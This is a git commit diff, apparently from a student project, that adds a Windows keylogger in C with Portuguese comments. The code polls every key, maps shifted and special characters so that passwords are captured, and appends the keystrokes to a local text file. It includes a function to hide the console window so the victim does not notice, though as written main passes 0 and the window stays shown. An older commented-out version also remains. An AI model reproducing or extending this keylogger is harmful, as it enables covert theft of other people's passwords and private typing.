778fad400e12e08ca36c6c53acffce6ea602bb26
jeanbalarin <jfrancisco@alunos.utfpr.edu.br>
2019-06-01 14:02:58 -0300

    Update keylogger1.cpp
    keylooger funcionando versao 4

--- keylogger1.cpp
+++ keylogger1.cpp
@@ -1,30 +1,189 @@
+#include<stdio.h>
 #include<windows.h>
+#include <time.h>
+
+//versao 4 funcionando! algumas teclas ainda nao estao mapeadas 
+
+void esconderTela(int x); // função para esconder a tela e o incone na barra de tarefas 
+						  // para q o usuario nao perceba q o keylogger esta sendo executado 
+void marcarTempo(FILE *arq, char arquivo[]); // grava a data e a hora que o keylogger começa a executar 
+int main(){
+	int chave,chaveFinal[0xFF];
+	int capsLock,numLock,shiftEsq,shiftDir;
+	int processado;
+	char teste;
+	char especial_1[] = ")!@#$%^&*(";
+	char especial_2[] = ";=,-./`";
+	char especial_3[] = ":+<_>?~";
+	char especial_4[] = "[\\]\';";
+	char especial_5[] = "{|}\"";
+	FILE *dados_teclado;
+	char arquivo[] = "dados_teclado.txt";
+	
+	esconderTela(0);
+	
+	marcarTempo(dados_teclado, arquivo);
+	
+	for(chave = 0;chave<0xFF;chave++){
+		chaveFinal[chave] = 0;
+	}
+	
+	
+	while(1){
+		
+		Sleep(10);
+		
+		
+		
+		shiftEsq = (GetKeyState(0xA0)&0xFF00) > 0 ? 1:0; // shift para esquerda 
+		shiftDir = (GetKeyState(0xA1)&0xFF00) > 0 ? 1:0; // shift para direita 
+		numLock = (GetKeyState(0x90)&0xFF) > 0 ? 1:0; // testa se numLock esta ativo
+		capsLock = (GetKeyState(0x14)&0xFF) > 0 ? 1:0; // testa se capsLock esta ativo
+		
+		
+		for(chave = 0;chave<0xFF;chave++){
+			
+			processado = (GetKeyState(chave)&0xFF00)>0?1:0;
+			teste = (char)chave;
+			
+			if(processado == 1 && chaveFinal[chave] == 0){
+				
+				// character a-z e A-Z
+				if(chave >= 0x41 && chave <= 0x5A){
+					if(capsLock == 0){
+						if(shiftEsq == 0 && shiftDir == 0){
+							teste = (char)(chave+0x20);
+						}
+					}
+					else if(shiftEsq == 1 || shiftDir == 1){
+						teste = (char)(chave+0x20);
+					}
+				}
+				
+				//numeros
+				else if(chave >= 0x30 && chave <= 0x39){
+					if(shiftEsq == 1 || shiftDir == 1){
+						teste = especial_1[chave-0x30];
+					}
+				}
+				
+				//numeros com numlook ativado
+				else if(chave >= 0x60 && chave <= 0x69 && numLock == 1){
+					teste = (char)(chave-0x30);
+				}
+				
+				// aqui começam os testes de character especiais 
+				// que que sao !@#$%¨&*()_+ entre outros podem ser usados em senhas
+				else if(chave >= 0xBA && chave <= 0xC0){
+					if(shiftEsq == 1 || shiftDir == 1){
+						teste = especial_3[chave-0xBA];
+					}
+					else{
+						teste = especial_2[chave-0xBA];
+					}
+				}
+				else if(chave >= 0xDB && chave <= 0xDF){
+					if(shiftEsq == 1 || shiftDir == 1){
+						teste = especial_5[chave-0xDB];
+					}
+					else{
+						teste = especial_4[chave-0xDB];
+					}					
+				}
+				
+				else if(chave == 0x0D){
+					teste = (char)0x0A;
+				}
+				else if(chave >= 0x6A && chave <= 0x6F){
+					teste = (char)(chave-0x40);
+				}
+				else if(chave != 0x20 && chave != 0x09){
+					teste = (char)0x00;
+				}
+				
+				
+				if(teste != (char)0x00){
+					printf("%c",teste);
+					dados_teclado = fopen(arquivo,"a");
+					putc(teste,dados_teclado);
+					fclose(dados_teclado);
+				}				
+				
+			}
+
+			chaveFinal[chave] = processado;
+		}		
+		
+		
+	}
+}
+
+
+void esconderTela(int x){ // se o parametro for 1 a tela fica escondida, se for 0 a tela vai aparecer no monitor
+	if(x == 1){
+		HWND window;
+		AllocConsole();
+		window=FindWindowA("ConsoleWindowClass",NULL);
+		ShowWindow(window,0);
+	}
+}
+
+void marcarTempo (FILE *arq, char arquivo[]){ // o ponteiro para o arquivo e passado por parametro para que a função possa gravar no arquivo
+
+	time_t tempo;
+    struct tm *tempoS;
+    tempo = time(NULL);
+    tempoS = localtime( &tempo );
+	
+	arq = fopen("arq.txt","a");
+	fprintf(arq,"\n%d/%d/%d - %d:%d:%d\n",tempoS->tm_mday, tempoS-> tm_mon+1, tempoS->tm_year-100, tempoS->tm_hour, tempoS->tm_min, tempoS->tm_sec );
+	fclose(arq);
+}
+
+
+
+
+/*#include<windows.h>
 #include<stdio.h>
 #include<stdlib.h>
 #include<conio.h>
 #include<string.h>
+#include<time.h>
 int chekEspecial1(FILE *arq, int tecla);
 int main(){
 	int teclas, resultado; //1º guarga a tecle digitada
 	                      //2º guarda o resultado da verificaçao
+	time_t tempo;
+    struct tm *tempoS;
+    tempo = time(NULL);
+    tempoS = localtime( &tempo );
+    
+	//HWND window;
+	//AllocConsole();
+	//window=FindWindowA("ConsoleWindowClass",NULL);
+	//ShowWindow(window,0);
+	
+	
+	
+	
 	
 	FILE *arq;
-	
-	arq = fopen("arq.txt", "w");
+	arq = fopen("arq.txt","a");
+	fprintf(arq,"\n%d/%d/%d - %d:%d:%d\n",tempoS->tm_mday, tempoS-> tm_mon+1, tempoS->tm_year-100, tempoS->tm_hour, tempoS->tm_min, tempoS->tm_sec );
 	fclose(arq);
-	
 	while(1){
-		for(teclas=64; teclas<= 100; teclas++){
-			Sleep(1);
+		for(teclas=0; teclas<=255; teclas++){
+			
 			resultado = GetAsyncKeyState(teclas);
 			
 			if(resultado == -32767){
 				arq = fopen("arq.txt", "a"); // fopen() funçao utilizada para abrir o arquivo
+				printf(" tecla= %d", teclas);
 				fprintf(arq,"%c", teclas);
 				fclose(arq);
 				
 			}
-			else{
+			/*else{
 				int res;
 				teclas = getch();
 				res = chekEspecial1(arq,teclas); 
@@ -41,10 +200,16 @@ int main(){
 	return 0;
 }
 
-int chekEspecial1(FILE *arq, int tecla){ // se gravar no arquivo retorna 1
-	int result = 1;
-	printf("tecla = %d", tecla);
-	arq = fopen("arq.txt","a");
+//passa o ponteiro para
+
+int chekEspecial1(FILE *arq, int tecla){ 
+
+	int result = 1; // se gravar no arquivo retorna 1
+	
+	printf("tecla = %d", tecla); // remover para entrega
+	// aqui imprime o valor de combinaçoes de tecla (nao é necessario imprimir na tela!!)
+	
+	arq = fopen("arq.txt","a"); // abre o aquivo para que possa gravar
 		
 	switch(tecla){
 		case 71: // HOME
@@ -138,7 +303,7 @@ int chekEspecial1(FILE *arq, int tecla){ // se gravar no arquivo retorna 1
         	fprintf(arq,"%s","ALT+F10");
             break;		
 		default:
-    		result = 0; // SE NAO FOR ENCONTRADO NENHUMA DESSAS TECLAS RETORNASE 0 PARA A FUNÇÃO PRINCIPAL
+    		result = 0; // SE NAO FOR ENCONTRADO NENHUMA DESSAS TECLAS RETORNA 0 PARA A FUNÇÃO PRINCIPAL
     		break;
     	
 	}
@@ -147,7 +312,7 @@ int chekEspecial1(FILE *arq, int tecla){ // se gravar no arquivo retorna 1
 	
 }
 
-
+*/
 
 
 
